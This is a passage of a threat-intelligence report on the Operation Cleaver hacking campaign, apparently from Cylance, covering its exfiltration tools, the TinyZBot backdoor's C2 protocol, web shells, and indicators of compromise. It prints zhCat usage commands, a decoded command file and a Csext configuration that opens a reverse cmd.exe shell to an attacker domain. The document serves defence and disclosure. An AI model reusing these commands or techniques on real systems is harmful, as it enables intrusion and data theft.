    64.120.208.75 -      Pilot Mountain, North           Carolina,     USA
    64.120.208.76 -      Pilot Mountain, North           Carolina,     USA
    64.120.208.78 -      Pilot Mountain, North           Carolina,     USA
    66.96.252.198 -      Pilot Mountain, North           Carolina,     USA
NetCat
NetCat is a network tool which has many valid purposes but can also be used for malicious
purposes. Its main functionality allows for a client and server communication channel, allowing
for information to be transported over the network simply. NetCat has an option when being
compiled to enable or disable the ability for NetCat to execute a command after the connection
is established. This feature can be abused to enable a reverse connecting shell, which can be
used to remotely control a target.
NetCat
s network communications are in plaintext, and could be viewed by an egress filter
looking to block the exfiltration of sensitive information. The Operation Cleaver team was
observed attempting to use NetCat to exfiltrate information as well as use it as a reverse
connecting shell. The use of NetCat was later replaced with zhCat.
#OPCLEAVER
  zhCat
  zhCat is a tool developed by the Operation Cleaver team which operates similarly to NetCat. Its
  main purpose is to create a channel that is capable of transporting information over the network.
  The changes made in zhCat allow for this information to be transferred with inline obfuscation and/
  or encryption. This makes it more difficult to detect that privileged information is being exfiltrated.
  The command line help (of a particular version) shows the following options:
                                  6f20476 f64
                                44
                              20
                               c
                             c2
                     04576696
  Multiple obfuscation/encryption methods are available. The 
h argument enables HTTP mode.
  This makes the traffic between zhCat instances look like benign HTTP traffic. For instance, if the
  attackers set up a zhCat instance listening on port 1000 on 192.168.116.128 in HTTP mode, the
  client instance of zhCat would use the following command:
                   b2
                            zhcat.exe 
p 1000 
i 192.168.116.128
                 e6
  The server instance would use the following command:
               96
                                 86  zhcat.exe 
p 1000
                              546
  When we run both of these, we can send information just by typing it into the terminal of the
  running application. Information can be supplied by standard input.
                                                                                                      43
                                                                                                                       476f6f64
                                                                                                                   6f20
                                                                                                                 44
OPERATION
                                                                                                               20
                                                                                                               2c
                                                                                                    b204576696c
CLEAVER
                                                                                                  e6
                                                                                                96
                                                                                                                  86
                                                                                                               546
 zhCat (cont.)
 If we observe the network communications during this transfer, we can see the following HTTP
 POST request.
 Note: research into ebizmba.com did not turn up any additional evidence of being involved
 with the development of zhCat.
 On the server side, we can see our message has been received:
 If stricter egress filtering is enabled, the attackers can use zhCat to also XOR encrypt the traffic
 with a shared key. These keys are stored inside zhCat. The following is the key used for XOR
 encryption:
     Sorry! The handle to file %s is not a valid handle any more.\nSorry!
             The handle to file %s is not a valid handle any more.
 The \n represents hex character 0x0A, which is a new line character.
 An attacker could set up a server instance of zhCat with the following command in order to
 enable both HTTP and XOR obfuscation:
                                zhcat.exe 
p 1000 
 The client instance could then be invoked with the following command:
                     zhcat.exe 
p 1000 
i 192.168.116.128 
 Once again, information can be supplied via standard input.
#OPCLEAVER
 zhCat (cont.)
 Upon inspecting the network traffic again, we see the following HTTP POST request.
                                  6 f 20476 f64
                             4 4
                          20see this information being received:
 On the server side, we can
                               c
                             c2
                     04576696
 zhCat has a variety of other features such as port mirroring as well as traffic redirecting.
 PLink
                   b2
 PLink is one of the many utilities provided in the PuTTY (SSH) suite, which has many benign
                 e6
 purposes. It is capable of communicating over various protocols, the most notable being SSH.
                6
 The SSH protocol is a heavily utilized encrypted protocol, most commonly used for remote
               9
 administration of UNIX based operating systems. PLink is designed to implement some of the
                                  6
                                 8
 SSH functions related to forwarding traffic as well as other functionality.
                              546
 Operation Cleaver uses PLink to forward local RDP ports to remote SSH servers. This allows them
 to easily connect to RDP servers inside the networks of their victims. These RDP connections can
 be used to exfiltrate information visually, as well as to remotely control the computers hosting the
 RDP servers.
                                                                                                    45
                                                                                                                    476f6f64
                                                                                                                6f20
                                                                                                              44
OPERATION
                                                                                                            20
                                                                                                            2c
                                                                                                 b204576696c
CLEAVER
                                                                                               e6
                                                                                             96
                                                                                                               86
                                                                                                            546
SMTP
Early Cleaver operations abused SMTP in order to exfiltrate information. The sending is
performed by internally developed malware samples such as TinyZBot and Csext in order to
exfiltrate information about the infected computer, as well as requested files and keystroke
logging information. Messages were sent using an open SMTP relay at BeyondSys.com with
the sender email address dyanachear(at)beyondsys.com. This allowed the attackers to use
infrastructure that was not theirs to exfiltrate information. The known recipient addresses of this
information were testmail_00001(at)yahoo.com and TerafficAnalyzer(at)yahoo.
com. In order to deceive anyone reading these emails, they made them appear to be a spam
message that most would not think twice about. The subject used is the following:
       No Prescription required. Viagra Dosages: 25, 100, 150mg.
       Fast worldwide delivery.
The message used is the following:
       Buy Viagra150mg x 50 tablets for only $124.99!
       No Prescription required. Viagra dosages: 150, 100, 25mg. Fast
       Worldwide Delivery.
       See the attachment movie.
       Free bonus trip.
       bestviagra4u.cn
The files being exfiltrated are added to the email as attachments.
SOAP
SOAP is a sub-protocol communicated via HTTP. In relation to Operation Cleaver, it is used as the
command and control protocol for TinyZBot, which was the preferred backdoor, and underwent
long-term development. HTTP communications are often used by botnets, but it is uncommon
to use a sub-protocol such as SOAP. It is likely that SOAP was used because it is simple to
implement in C#, and has the added benefit of blending in with other benign HTTP traffic.
As part of TinyZBot
s command and control protocol, files can be exfiltrated over SOAP to the
command and control server. For more information about TinyZBot, see the Persistence section.
#OPCLEAVER
  PERSISTENCE
  Persistence is the means of maintaining access to a compromised network. There are limitless
  methods of persistence; the following are techniques and tools for persistence used by Cleaver.
  TinyZBot
  TinyZBot is a backdoor developed in C#. This bot is the longest developed malware we have
  analyzed from this organization. The earliest known version was compiled in January 2013 and
  we continued to see new versions being created actively. The purpose of TinyZBot is to gather
  information from an infected computer as well as maintain and further access into a compromised
  network.
                                   f20476 f64
  TinyZBot was developed with the clear intention of targeted campaigns. The name TinyZBot is
                                  6
                                 4
  assumed to be referring to this project as a less versatile version of the ZeuS botnet, although
                                4
                              20
  it does not exhibit the major browser injection features of ZeuS. To be clear, TinyZBot shares
  no code with ZeuS or its variants, and is developed in a different programming language. The
                               c
  majority of the code in TinyZBot was created by Cleaver.
                             c2
                     04576696
  TinyZBot Features
  TinyZBot supports a wide array of features that continually evolved over time. For the evolution of
  features, see the History section. The following is a list of supported features:
   SMTP exfiltration
                    2
   Log keystrokes
                   b
   Monitor clipboard activity
                  6
   Enable a SOAP-based command and control channel
                 e
   Self-updating
               96
   Download and execute arbitrary code
   Capture screenshots        86
                              546
      Extract saved passwords for Internet Explorer
      Install as a service
   Establish persistence by shortcut in startup folder
   Provide unique malware campaign identifiers for tracking and control purposes
   Deceptive execution methods
   Dynamic backdoor configuration
   FTP exfiltration
   Security software detection
   Ability to disable Avira antivirus
   Ability to modify PE resources
   Dynamic plugin structure
                                                                                                     47
                                                                                                                    476f6f64
                                                                                                                6f20
                                                                                                              44
OPERATION
                                                                                                            20
                                                                                                            2c
                                                                                                 b204576696c
CLEAVER
                                                                                               e6
                                                                                             96
                                                                                                               86
                                                                                                            546
TinyZBot Command and Control Protocol
The command and control mechanism for TinyZBot utilizes SOAP communicating over HTTP.
Potential reasons for using SOAP are:
1. SOAP-based communications are simple to implement in C#.
2. SOAP traffic could easily be considered benign traffic, as it is not commonly seen in malware.
As part of SOAP communications, a URI is specified. This is internal to the sub-protocol, and does
not necessarily reflect the URI of the host running the SOAP server (ASMX file). In the case of
TinyZBot, and many examples for developing SOAP applications, this URI is tempuri.org.
Since the first version of the SOAP-based command and control protocol was implemented,
TinyZBot used what is referred to as a 
dynamic password
. The result of this is a
cryptographically hashed version of the server time (which must be obtained through a SOAP
query), the TinyZBot
s GUID, and the TinyZBot
s AppUsageID (campaign identifier).
For the command and control examples below, red text represents TCP data sent from the
TinyZBot infection while blue text represents TCP data sent from the command and control
server. The server time lookup query invokes the SOAP command GetServerTime.
POST /checkupdate.asmx HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.1433)
Content-Type: text/xml; charset=utf-8
SOAPAction: 
http://tempuri(dot)org/GetServerTime
Host: microsoftactiveservices(dot)com
Content-Length: 291
Expect: 100-continue
Connection: Keep-Alive
HTTP/1.1 100 Continue
<?xml version=
 encoding=
utf-8
?><soap:Envelope
xmlns:soap=
http://schemas.xmlsoap.org/soap/envelope/
 xmlns:xsi=
http://www.w3.org/2001/
XMLSchema-instance
xmlns:xsd=
http://www.w3.org/2001/XMLSchema
><soap:Body><GetServerTime xmlns=
http://tempuri.
org/
 /></soap:Body></soap:Envelope>
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: text/xml; charset=utf-8
Server: Microsoft-IIS/7.5
X-AspNet-Version: 2.0.50727
X-Powered-By: ASP.NET
Date: Mon, 06 Oct 2014 13:36:47 GMT
Content-Length: 392
#OPCLEAVER
  TinyZBot Command and Control Protocol (cont.)
  <?xml version=
 encoding=
utf-8
?><soap:Envelope
  xmlns:soap=
http://schemas.xmlsoap.org/soap/envelope/
 xmlns:xsi=
http://www.w3.org/2001/
  XMLSchema-instance
  xmlns:xsd=
http://www.w3.org/2001 XMLSchema
><soap:Body><GetServerTimeResponse xmlns=
http://
  tempuri.org/
><GetServerTimeResult>2014-10-06T13:36:47.2193601Z</GetServerTimeResult></
  GetServerTimeResponse></soap:Body></soap:Envelope>
  This is the first query done by a running TinyZBot instance, and needs to be done shortly before
  most other queries, in order to update the dynamic password.
  Commands, updates and files to drop and execute are stored as files on the SOAP server, and
  access is restricted by the AppUsageID as well as the bot GUID. This allows for commands to be
                                  6f20476 f64
  sent to all bots for a campaign as well as individual control. The TinyZBot queries the server in
  order to enumerate all files currently available to it.
                             4 4
                           0
  User-Agent: Mozilla/4.0 2
  POST /checkupdate.asmx HTTP/1.1
                          (compatible; MSIE 6.0; MS Web Services Client Protocol 2.0.50727.1433)
                               c
  Content-Type: text/xml; charset=utf-8
                             c2
  SOAPAction: 
http://tempuri(dot)org/GetFileList
  Host: microsoftactiveservices(dot)com
                     04576696
  Content-Length: 425
  Expect: 100-continue
  HTTP/1.1 100 Continue
  <?xml version=
 encoding=
utf-8
?><soap:Envelope xmlns:soap=
http://schemas.xmlsoap.org/
  soap/envelope/
  xmlns:xsi=
http://www.w3.org/2001/XMLSchema-instance
 xmlns:xsd=
http://www.w3.org/2001/
  XMLSchema
><soap:Body><GetFileList xmlns=
http://tempuri(dot)org/
><Id>00cf6217-8c7e-4598-
  b155-65ebd949bba9</Id><AppType>XYZCO</AppType><IP /><Pass>abefc81</Pass><Version>BDFF;1.0.0</
                    2
  Version></GetFileList></soap:Body></soap:Envelope>
                  6b
  HTTP/1.1 200 OK Cache-Control: private, max-age=0
                 e
  Content-Type: text/xml; charset=utf-8
                6
  Server: Microsoft-IIS/7.5 X-AspNet-Version: 2.0.50727
               9
  X-Powered-By: ASP.NET Date: Mon, 06 Oct 2014 13:36:47 GMT
  Content-Length: 1474           86
                              546
  <?xml version=
 encoding=
utf-8
?><soap:Envelope xmlns:soap=
http://schemas.xmlsoap.org/
  soap/envelope/
  xmlns:xsi=
http://www.w3.org/2001/XMLSchema-instance
  xmlns:xsd=
http://www.w3.org/2001/XMLSchema
><soap:Body><GetFileListResponse xmlns=
http://
  tempuri.org/
                                                                                                     49
                                                                                                                 476f6f64
                                                                                                             6f20
                                                                                                           44
OPERATION
                                                                                                         20
                                                                                                         2c
                                                                                              b204576696c
CLEAVER
                                                                                            e6
                                                                                          96
                                                                                                            86
                                                                                                         546
TinyZBot Command and Control Protocol (cont.)
<GetFileListResult><string>[ALL]__b93c-49a1-140914084450__[0000000000000000000000000000
0000].tmu</string><string>[ALL]__b93c-49a1-140914084612__[0000000000000000000000000000
0000].tmu</string><string>[ALL]__b93c-49a1-140914084619__[00000000000000000000000000000
000].tmu</string><string>[ALL]__b93c-49a1-140914084628__[00000000000000000000000000000
000].tmu</string><string>[ALL]__b93c-49a1-140914084638__[00000000000000000000000000000
000].tmu</string><string>[ALL]__b93c-49a1-140914084644__[00000000000000000000000000000
000].tmu</string><string>[ALL]__b93c-49a1-140914084659__[000000000000000000000000000000
00].tmu</string><string>[ALL]__b93c-49a1-140914084715__[0000000000000000000000000000000
0].tmu</string><string>[ALL]__b93c-49a1-140914084732__[00000000000000000000000000000000
].tmu</string><string>[ALL]__b93c-49a1-140914084741__[00000000000000000000000000000000].
tmu</string><string>[ALL]__b93c-49a1-140914090807__[00000000000000000000000000000000].tmu</
string><string>[ALL]__b93c-49a1-140915103605__[00000000000000000000000000000000].tmu</
string><string>[ALL]__b93c-49a1-140915103610__[00000000000000000000000000000000].tmu</string></
GetFileListResult></GetFileListResponse></soap:Body></soap:Envelope>
In order to download the file and parse for commands to execute, the TinyZBot must request the
file. The file is downloaded Base64-encoded inside of the SOAP response.
POST /checkupdate.asmx
HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol
2.0.50727.1433)
Content-Type: text/xml; charset=utf-8
SOAPAction: 
http://tempuri(dot)org/GetFile
 Host: microsoftactiveservices(dot)com
Content-Length: 478
Expect: 100-continue
HTTP/1.1 100 Continue
<?xml version=
 encoding=
utf-8
<soap:Envelope xmlns:soap=
http://schemas.xmlsoap.org/soap/envelope/
 xmlns:xsi=
http://www.
w3.org/2001/XMLSchema-instance
xmlns:xsd=
http://www.w3.org/2001/XMLSchema
<soap:Body><GetFile xmlns=
http://tempuri(dot)org/
><Id>00cf6217-8c7e-4598-b155-65ebd949bba9</
Id><AppType>XYZCO</AppType><IP /><Pass>abefc81</Pass><FileName>[ALL]__b93c-49a1-140914084450__
[00000000000000000000000000000000].tmu</FileName></GetFile></soap:Body></soap:Envelope>
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: text/xml; charset=utf-8
Server: Microsoft-IIS/7.5
X-AspNet-Version: 2.0.50727
X-Powered-By: ASP.NET Date: Mon, 06 Oct 2014 13:36:47 GMT
Content-Length: 652
<?xml version=
 encoding=
utf-8
?><soap:Envelope xmlns:soap=
http://schemas.
xmlsoap.org/soap/envelope/
 xmlns:xsi=
http://www.w3.org/2001/XMLSchema-instance
xmlns:xsd=
http://www.w3.org/2001/XMLSchema
<soap:Body><GetFileResponse xmlns=
http://tempuri(dot)org/
<GetFileResult>OzIwMTQwOTE0X18wODQ0NTANClJVTkNNRD1jbWQuZXhlLC9DIGlwY29uZmlnIC9hbGwgP
j4gIltJTkZPTERFUl1cZDJkYjY5NmEtMzM2Ny00Njk5LWE4MTUtZGYwOTA5OGJjNTk2LnR4dCIgMj4mMQ0KV
VBMT0FEPVtJTkZPTERFUl1cZDJkYjY5NmEtMzM2Ny00Njk5LWE4MTUtZGYwOTA5OGJjNTk2LnR4dA0KREVMR
VRFPVtJTkZPTERFUl1cZDJkYjY5NmEtMzM2Ny00Njk5LWE4MTUtZGYwOTA5OGJjNTk2LnR4dA==
</GetFileResult></GetFileResponse></soap:Body></soap:Envelope>
#OPCLEAVER
  TinyZBot Command and Control Protocol (cont.)
  The command file downloaded in this example is as follows:
  ;20140914__084450
  RUNCMD=cmd.exe,/C ipconfig /all >> 
[INFOLDER]\d2db696a-3367-4699-a815-df09098bc596.txt
2>&1
  UPLOAD=[INFOLDER]\d2db696a-3367-4699-a815-df09098bc596.txt
  DELETE=[INFOLDER]\d2db696a-3367-4699-a815-df09098bc596.txt
  The first line is a timestamp of the command. The TinyZBot command parser ignores it. The
  RUNCMD line requests that cmd.exe be executed, with the command ipconfig /all being
  redirected to a file in a directory designated for files to be uploaded. The UPLOAD command
  requests that this file is then uploaded over SOAP to the command and control server. The
  DELETE command then requests that the file be deleted from the infected system.
                                     f20476 f64
  The following is a list of supported commands that TinyZBot responds to:
                                    6
                          KILL 4
                                   4
  COPY
  REPLACE
                             2 0
                          DEEPKILL
                                          GETSCREENSHOT
                                          CREATEUPLOADLIST
                                                                             UNLOADALL
                                                                             RELOADALL
  DELETE                  EXIT            FORCERESTART                       ADDSEC
                               c
  UPLOAD                  EXITFORCE            FORCEEXIT                     REMSEC
                             c2
  FUPLOAD                 RUNAVDETECTOR        UNLOADMODULE                  ADDKV
                     04576696
  CLEARFILES              RUNWAIT              RELOADMODULE                  CHGKV
  CLEAROUPUTFOLDER        RUNCMD               LOADMODULE                    REMKV
  SAVECONFIG              UCMD                 UNLOADM                       ADDK
  SAVETOCFGFILE           GETINFO              RELOADM                       REMOVEK
  RESTART                 GETSCREENSHOTHQ      REMOVEM
  RestartForce
  Commands such as GETINFO are often run on newly infected systems, as they decide whether
  the infection has hit the correct target. There are additional SOAP commands, but they will not be
                    2
  covered in detail. The following is a list of all the SOAP commands: CheckFileMD5, GetFile,
                   b
  GetFileList, GetServerTime, UploadFile.
                 e6
                6
  Deception
               9
                                 86
                              546
  TinyZBot is commonly installed using some form of deception. Recent versions use the resume-
  based methods reported in the Initial Compromise sections. An additional method was used for
  earlier versions. When early versions of TinyZBot were executed, they opened an image stored
  in the resource section of the executable and copied the malicious TinyZBot executable to the
  %AppData% directory.
  Many of the images identified were of the popular Lebanese singer and actress Haifa Wehbe. The
  backdoor additionally replaced the original malicious executable with an appropriately named
  image file and padded the image file with null bytes in order to mirror the original file size.
                                                                                                   51
                                                                                                                        476f6f64
                                                                                                                    6f20
                                                                                                                  44
OPERATION
                                                                                                                20
                                                                                                                2c
                                                                                                     b204576696c
CLEAVER
                                                                                                   e6
                                                                                                 96
                                                                                                                   86
                                                                                                                546
 History
 The earliest known version on TinyZBot was compiled on January 27, 2013. This early version
 had very little functionality. It was limited to logging keystroke data, sending emails, and creating
 a link in the user
s startup folder for persistence. Its method of exfiltrating the logged keystrokes
 relied upon a hardcoded email address stored in the binary. The sender email address was
 dyanachear(at)beyondsys.com and emails were destined for testmail_00001(at)
 yahoo.com. The message was intended to look like common Viagra spam from China, but
 would be sent with the keystroke logging data as attachments, as well as system information.
 The initial version did not provide any means of receiving commands and was obfuscated with
 SmartAssembly. The following iteration compiled on March 12, 2013, only contained minor bug
 fixes.
 The next version was compiled on April 24, 2013. This version starts to look more like an
 average bot. A command and control protocol was established, using HTTP and SOAP for the
 protocol. The command and control server for this version was located at 173.192.144.68/
 DefaultWS(dot)asmx. This new command and control protocol allowed for the addition of
 quite a few other features. An update mechanism was added, and could be regularly scheduled,
 so unassisted periodic update checks were automatically performed. The SOAP API used a
 dynamic password mechanism, which required the computation of a simple key in order to
 access certain parts of the API. The email data exfiltration method also underwent modification
 to be activated at a scheduled interval. There were also some changes, which looked to be bug
 fixes, such as limiting the number of times sending an email could fail.
 The next day, April 25, 2013, a new version was compiled which allowed for self-deletion.
 On May 14, 2013, we noticed a change which assisted in the identification of active targets.
 The AppUsageId (at this point named AppType) was an identifier used by this organization in
 order to differentiate between targets infected with TinyZBot, meaning they could effectively
 run multiple campaigns using the same command and control server and know which target
 was infected. This also allowed for separate commands to be supplied to different targets
 without the need for per-bot commands. At this time, the AppUsageId was total0, but later
 we observed names, which aligned with active targets. The exfiltration email address was also
 changed to TerafficAnalyzer(at)yahoo.com.
 On June 17, 2013, there was an addition that allowed for the loading of configuration data from
 the PE
s resources. At this time, it was limited to the exfiltration email address. This version was
 not obfuscated with SmartAssembly
#OPCLEAVER
  History (cont.)
  We do not see a new version of TinyZBot until June 7, 2014. There are quite a few notable
  improvements, but nowhere near enough to indicate consistent development on the project for
  a year. SmartAssembly was reused again. A method was added to detect what security related
  software is installed. Avira antivirus was specifically targeted and disabled, due to its detection of
  the new keystroke logger module added in this version. This keystroke logger source is publicly
  available and referred to as DeadkeyLogger.
  A new string encryption class is added, but the code was copied and pasted from a Microsoft
  example. The ability to extract Internet Explorer passwords was added. Clipboard monitoring
  code was added, but not invoked. The emailing features were removed, but the classes which
                                       20476 f64
  previously contained them were still present but empty. Many more options were enabled to
                                  6   f
  be loaded from PE resources. The ability to add PE resources was added. Another version was
                                4
                             4
  compiled on June 7, 2014, with no feature difference.
                           0
  On June 17, 2014, we see2the first instance of Binder_1, which is aptly named, as it is a binder.
                               c
  The legitimate application used in this version of Binder_1 was compiled on August 22, 2013,
                             c2
  and is a self-extracting archive of desktop wallpapers, including an image from the game Mirror
                     04576696
  Edge. The TinyZBot included was the version compiled on June 7, 2014.
  The version compiled on June 23, 2014, added functionality which allowed screenshots of the
  desktop to be taken.
  On August 2, 2014, we see another version without SmartAssembly obfuscation. A bug fix is made
  to the keystroke logging method, and clipboard monitoring is enabled.
                  6b2
  Three items were compiled on August 18, 2014. Two of them are TinyZBot binaries, which contain
                 e
  a minor key logging bug fix. The third is a new Binder_1 instance, which contains one of the
                6
  TinyZBot instances compiled that day. The legitimate application included in this binder is called
               9
  Easy_resume_creator and is a legitimate application named EasyR
CreatorPro. This
                                 86
  version targeted a major Saudi Arabian oil company.
                              546
  From August 23 to August 26, 2014, new versions of TinyZBot were compiled with the
  AppUsageIds targeting major oil and gas companies in Qatar and Kuwait, Ministries of Foreign
  Affairs in the Persian Gulf, and a major airline holding company in UAE. These versions of
  TinyZBot moved towards a more modular architecture where each component was in its own
  .NET assembly. This was presumably done to limit antivirus detection of each individual file as
  well as allow for dynamic updating of specific modules. All of these were included in their own
  Binder_1 instance, which also dropped Easy_resume_creator.
                                                                                                       53
                                                                                                                   476f6f64
                                                                                                               6f20
                                                                                                             44
OPERATION
                                                                                                           20
                                                                                                           2c
                                                                                                b204576696c
CLEAVER
                                                                                              e6
                                                                                            96
                                                                                                              86
                                                                                                           546
 History (cont.)
 There also seem to be improved software engineering practices in many locations. FTP upload
 support was added, with hardcoded credentials of ano:1. This FTP upload functionality points
 to the command and control server, and is invoked by a command in the SOAP command and
 control channel. These versions have the capability to install as a service.
 On August 25, 2014, the version compiled on August 18 was submitted to VirusTotal in a ZIP
 archive located at http://dl.doosan-job(dot)com/cv/Easy_Resume_Creator-
 v2.0.zip. This indicates that TinyZBot is not only being installed while impersonating a r
 creation suite, but is also impersonating potential employers when distributed.
 On September 9, 2014, a ZIP file containing TinyZBot and a configuration targeting a major US
 university with its AppUsageId was created. This was discovered on an anonymous FTP server
 in the same IP range as dl.doosan-job(dot)com along with other malware.
 From September 11 through September 17, 2014, some TinyZBot components were compiled,
 along with a new dropper. This dropper impersonated a tool to submit a r
 to Teledyne.
 When executed, the user is prompted to enter personal information, and at the end is given a
 button to submit the r
 to Teledyne, although nothing is actually submitted. While the user
 enters this information, their machine is infected with TinyZBot. The AppUsageIds for these
 versions target a major US-based university as well as an Israeli aerospace company. These
 versions began to include a new method of installing as a service. The service runs with the
 name Network Connectivity Manager.
 Interesting Notes
 TinyZBot, as well as some other tools (Csext, Net Crawler) initially would not run without a
 command line parameter set. This was likely to avoid detonation-based detection engines. This
 command line parameter was opensesemi which is often stored in the application
s code in
 an obfuscated manner. The binders and droppers for TinyZBot provided this command line
 argument and others when executing.
 TinyZBot uses a dynamic mutex. This was accomplished by combining a static preset prefix with
 the active process ID. This allowed supplemental tools to keep TinyZBot running by enumerating
 every process and checking if the process ID and mutex prefix existed. If no mutex and process
 pair was located, another TinyZBot instance would be started.
#OPCLEAVER
  Command and Control Servers
        
   88.150.214.168, United Kingdom, microsoftactiveservices(dot)com
        
   95.211.241.249, Amsterdam, Noord-Holland, Netherlands
        
   88.150.214.166, United Kingdom
        
   173.192.144.68, Seattle, Washington, USA
        
   188.227.180.213, United Kingdom
        
   192.111.145.197, Rochester, New York, USA
  Backdoors
  Multiple backdoors were used by this organization. These are scripts or applications that allowed
  for command or code execution outside of the victim network. Many of their backdoors were web
                                   f20476 f64
  applications, added to web servers, so commands can be executed from a browser or client able
                                  6
                                 4
  to communicate with them. This group includes the results of the Shell Creator mentioned in the
                                4
                              20
  Attribution section, as well as ASPX backdoors used by Nesha. A PHP shell was also observed,
  which also included attribution to Nesha in its hashed password.
                               c
                             c2
  An ASPX backdoor named Zh0uSh311 was located on live servers as well as recovered from
                     04576696
  a staging server. This backdoor does not require authentication, and its use appears to be
  straightforward. Its functionality breaks down into three fairly standard components: SQL queries,
  executing commands, and uploading files.
                  6b2
                6e
               9
                                 86
                              546
                     Figure 24: The ASPX backdoor named 
Zh0uSh3ll
, allowing SQL queries.
                                                                                                   55
                                                                                                                  476f6f64
                                                                                                              6f20
                                                                                                            44
OPERATION
                                                                                                          20
                                                                                                          2c
                                                                                               b204576696c
CLEAVER
                                                                                             e6
                                                                                           96
                                                                                                             86
                                                                                                          546
                      Figure 25: The ASPX backdoor named 
Zh0uSh3ll
, allowing file
 This organization utilized backdoors which masqueraded as varying versions of Notepad. They
 replace the existing Notepad.exe on the infected machine, and when run they call out to a
 remote server and execute any shell code returned by the remote server. There will be a detailed
 analysis of these backdoors posted to Cylance
s blog in the future.
 PVZ
 PVZ is a name for a set of executables used together to create a botnet. The name PVZ was
 assigned by us as this is one of the few tools this organization has not named themselves.
#OPCLEAVER
  PVZ (cont.)
  The components are as follows:
   PVZ-In
   PVZ-Out
   Syn Flooder
   LoggerModule
   XYNTService
   Jasus
  XYNTService was not developed by the Cleaver team, but instead is a publicly available project
  which executes an executable as a service.
  PVZ-In                        6f20476 f64
                            4 4
  The purpose of PVZ-In 2
                          0
                        is to communicate with a command and control server. Communication
                               c
  is primarily unidirectional, as little information is provided from the bot to its command and
                             c2
  control server. The known command and control server is located at http://kundenpflege.
                     04576696
  menrad(dot)de/js/jquery/default.aspx and the command and control protocol only uses
  HTTP. The commands as well as infected computer information are transferred in the Content-
  Disposition HTTP header, making the traffic easy to pass over as benign.
  When a command is received from the server, the results are stored in a central location on disk
  that the PVZ tools utilize. Command functionality is limited to executing supplied commands,
  downloading and executing executables as well as self-updating.
                   b2
  The debug file path for PVZ-In is:
                 e6
                6
  C:\Users\parviz\documents\visual studio 2010\Projects\BotManager\
               9
  Release\BotManager.pdb          6
                                 8
                              546
  PVZ-In has been observed using the file name ossisvc.exe.
  PVZ-Out
  PVZ-Out is the other half of the command and control channel, primarily uploading results of
  commands and keystroke logging data to a remote server. The known command and control server
  for PVZ-Out is located at http://www.gesunddurchsjahr(dot)de/tor/default.aspx.
  Much like PVZ-In, this command and control channel communicates with the Content-Disposition
  HTTP header, but for file data, POST data is supplied.
                                                                                                     57
                                                                                                                    476f6f64
                                                                                                                6f20
                                                                                                              44
OPERATION
                                                                                                            20
                                                                                                            2c
                                                                                                 b204576696c
CLEAVER
                                                                                               e6
                                                                                             96
                                                                                                               86
                                                                                                            546
Data uploaded is often compressed, which can make it more difficult to detect the exfiltration of
sensitive information.
The debug file path for PVZ-Out is:
C:\Users\Parviz\documents\visual studio 2010\Projects\SendModule\
Release\SendModule.pdb
PVZ-Out has been observed with the file name osppsvc.exe.
SYN Flooder
SYN Flooder is a simple network based denial of service tool. It is a command line utility capable of
being invoked by PVZ-In. Targeting information is supplied via command line parameters.
The debug file path for SYN Flooder is:
C:\Users\parviz\Documents\Visual Studio 2010\Projects\socket-test\
Release\socket-test.pdb
SYN Flooder has been observed using the name ossysvc.exe.
Logger Module
Logger Module observes the user
s actions and records them to a file. The recorded actions include
mouse clicks, active windows, keypresses, as well as clipboard data. The resulting log is written out
to a location where PVZ-Out can exfiltrate it to its command and control server. Logger Module has
been observed using the name ospcsvc.exe.
The following command and control servers for Logger Module have been observed:
212.87.154.14, Baden-Wurttemberg, Germany, kundenpflege.menrad(dot)de
212.87.154.12, Baden-Wurttemberg, Germany, www.gesunddurchsjahr(dot)de
wndTest
WndTest is the evolution of the PVZ tool chain into a single executable. The tool chain is minimized
down to a command and control communications, keystroke logging, and clipboard monitoring.
The command and control still supports upgrading, downloading, and executing of applications, as
well as executing batch scripts. WndTest installs as a service and has been observed attempting to
impersonate Adobe Report Service. WndTest starts using PHP servers for its command and control
server, some of which are listed as defaced sites.
#OPCLEAVER
  We have seen wndTest communicate with the following servers:
   209.208.97.44, Orlando, Florida, USA, www.lat(dot)am
   23.238.17.181, Tulsa, Oklahoma, USA, regulatorfix(dot)com
   209.208.97.44, Orlando, Florida, USA, www.asiess(dot)com
   198.50.100.210, Quebec, Canada, halon(dot)com.br
   207.182.142.68, Columbus, Ohio, USA
   95.211.191.247, Amsterdam, Noord-Holland, Netherlands
  Csext
  Csext is a backdoor application developed in C# which runs as a service. Its primary functionality
  is based on commands supplied by its configuration file. The configuration file is able to store
                          6f20476 f64
  specific commands, which are intended to run at particular times. A recovered configuration is as
  follows:
                       44
                    20
  domain1=srv01.microsoftwindowsupdate(dot)net,check.html,3
  %%
                                c
                              c2
  {0}\{zhname}$$ -h -x -i {domain1} -p 443 -e c:\windows\system32\cmd.
                      04576696
  exe ,taskkill.exe$$/F /PID {pid},00:29,00:35
  %%
  ##
  This configuration executes zhCat to connect back to srv01.microsoftwindowsupdate(dot)net (a
  deceptive domain owned by this group with falsified Whois data attributing to Microsoft Investor
  Relations) with XORed communication using the HTTP protocol on TCP port 443. This zhCat
                     2
  instance is running cmd.exe, effectively making it a reverse connecting shell. This command
                    b
  runs at 00:29 in the morning, and is killed by taskkill at 00:35. This gives the attackers a
                   6
  predictable method to regain access to a compromised network if they ever lose access.
                 6e
                9
  Csext also has email functionality similar to TinyZBot. This email functionality is used to exfiltrate
                                   6
  the results of commands from the command file which can also include requests like gathering
                                  8
  user information.            546
  We have seen Csext configured to communicate with the following servers:
 78.47.102.90, Germany, srv01.microsoftwindowsupdate(dot)net
 174.36.195.158, Washington D.C, USA, srv01.microsoftupdateserver(dot)
  net
                                                                                                           59
                                                                              476f6f64
                                                                          6f20
                                                                        44
OPERATION
                                                                      20
                                                                      2c
                                                           b204576696c
CLEAVER
                                                         e6
                                                       96
                                                                         86
                                                                      546
 MITIGATION COVER
                      MITIGATION
     TTP COVER HERE
                                   6f20476f6f64
                                 44
                               20
                                c
                              c2
                    b204576696
                 6e6
                9
                                  86
                               546
                                                  #OPCLEAVER
#OPCLEAVER
  MITIGATION
  If after reviewing the Indicators of Compromise (IOC) listed in Appendix A, you believe your
  organization to be a victim of Operation Cleaver, we recommend you consider the following course
  of action:
  1. If inside the United States, contact the Federal Bureau of Investigation (FBI) via either your local
  FBI team or FBI CYWATCH at 1-855-292-3937 or cywatch@ic.fbi.gov.
  2. If outside the United States, contact your local, district, state or federal law enforcement
